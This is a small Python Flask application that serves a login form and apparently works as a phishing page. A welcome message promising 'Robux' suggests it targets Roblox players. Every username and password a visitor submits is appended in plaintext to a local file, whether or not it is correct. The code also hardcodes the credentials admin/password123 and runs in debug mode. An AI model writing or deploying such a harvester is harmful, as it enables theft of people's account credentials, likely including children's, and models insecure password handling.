from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

# Dummy credentials for login (replace with a real database or authentication system)
USERNAME = "admin"
PASSWORD = "password123"

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        # Log the credentials to a file (save login attempts)
        with open('login_info.txt', 'a') as file:
            file.write(f"Username: {username}, Password: {password}\n")

        # Check if the username and password are correct
        if username == USERNAME and password == PASSWORD:
            return redirect(url_for('welcome'))
        else:
            return "Invalid username or password. Please try again."

    return render_template('login.html')

@app.route('/welcome')
def welcome():
    return "Welcome to your dashboard! Enjoy your Robux!"

if __name__ == "__main__":
    app.run(debug=True)

